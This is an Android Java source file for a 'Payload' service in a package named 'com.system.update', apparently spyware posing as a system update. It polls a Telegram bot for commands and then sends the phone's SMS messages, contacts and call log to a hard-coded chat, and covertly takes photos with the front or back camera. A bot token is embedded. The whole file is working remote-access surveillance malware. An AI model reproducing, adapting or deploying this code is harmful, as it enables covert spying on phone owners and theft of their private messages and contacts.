package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.net.Uri;
import android.hardware.Camera;
import android.os.Environment;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.File;
import java.io.FileOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.TimeUnit;

public class Payload extends Service {
    private String BOT_TOKEN = "9153767226:AAG9WkQcikOjpFiwWKpQ8GkRC92xOUO92sc"; 
    private String CHAT_ID = "8598136412";
    
    private volatile boolean isRunning = true;
    private long lastUpdateId = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d("SystemUpdate", "Service started...");
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10";
                        URL url = new URL(urlStr);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        
                        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String line;
                        while ((line = in.readLine()) != null) { response.append(line); }
                        in.close();

                        String jsonResponse = response.toString();
                        
                        if (jsonResponse.contains("\"update_id\":")) {
                            int startIdx = jsonResponse.lastIndexOf("\"update_id\":") + 12;
                            int endIdx = jsonResponse.indexOf(",", startIdx);
                            if (endIdx == -1) endIdx = jsonResponse.indexOf("}", startIdx);
                            lastUpdateId = Long.parseLong(jsonResponse.substring(startIdx, endIdx).trim());
                        }
                        
                        if (jsonResponse.contains("\"text\":\"/dump_sms\"")) {
                            sendTelegramMessage("📩 *Dump SMS:*\n" + getSms());
                        } else if (jsonResponse.contains("\"text\":\"/dump_kontak\"")) {
                            sendTelegramMessage("👥 *Dump Kontak:*\n" + getContacts());
                        } else if (jsonResponse.contains("\"text\":\"/dump_telpon\"")) {
                            sendTelegramMessage("📞 *Dump Call Log:*\n" + getCallLogs());
                        } else if (jsonResponse.contains("\"text\":\"/foto_depan\"")) {
                            takePhoto(1);
                        } else if (jsonResponse.contains("\"text\":\"/foto_belakang\"")) {
                            takePhoto(0);
                        }
                    } catch (Exception e) { e.printStackTrace(); }
                    try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) { e.printStackTrace(); }
                }
            }
        });
        return START_STICKY;
    }

    private String getSms() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
                    sb.append("Dari: ").append(cursor.getString(cursor.getColumnIndex("address"))).append("\nPesan: ").append(cursor.getString(cursor.getColumnIndex("body"))).append("\n\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca SMS."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada SMS.";
    }

    private String getContacts() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 30; i++) {
                    sb.append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(" - ").append(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca Kontak."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada Kontak.";
    }

    private String getCallLogs() {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor != null && cursor.moveToFirst()) {
                for (int i = 0; i < cursor.getCount() && i < 15; i++) {
                    sb.append("Nomor: ").append(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))).append("\n");
                    cursor.moveToNext();
                }
                cursor.close();
            }
        } catch (Exception e) { return "Gagal baca Call Log."; }
        return sb.length() > 0 ? sb.toString() : "Tidak ada Call Log.";
    }

    private void takePhoto(int cameraId) {
        try {
            Camera camera = Camera.open(cameraId);
            camera.startPreview();
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    try {
                        File file = new File(Environment.getExternalStorageDirectory(), "sys_photo_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        fos.write(data);
                        fos.close();
                        camera.release();
                        sendTelegramMessage("📸 Foto berhasil diambil.");
                    } catch (Exception e) { e.printStackTrace(); }
                }
            });
        } catch (Exception e) { sendTelegramMessage("❌ Gagal ambil foto."); }
    }

    private void sendTelegramMessage(String pesan) {
        try {
            String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
            new URL(urlStr).openConnection().getInputStream().close();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
